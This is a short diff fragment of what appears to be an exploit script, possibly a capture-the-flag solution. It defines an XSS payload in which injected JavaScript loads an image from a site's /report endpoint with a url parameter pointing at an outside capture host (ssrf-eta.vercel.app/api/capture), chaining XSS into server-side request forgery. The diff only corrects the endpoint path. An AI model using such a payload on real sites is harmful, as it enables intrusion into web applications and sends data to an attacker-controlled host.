@@ -7,7 +7,7 @@
         const xssPayload = `
             // Create an image to trigger the SSRF
             var img = new Image();
-            img.src = "/reports?url=https://ssrf-eta.vercel.app/api/capture";
+            img.src = "/report?url=https://ssrf-eta.vercel.app/api/capture";
         `;
 
         // Vulnerable endpoint with the XSS injection
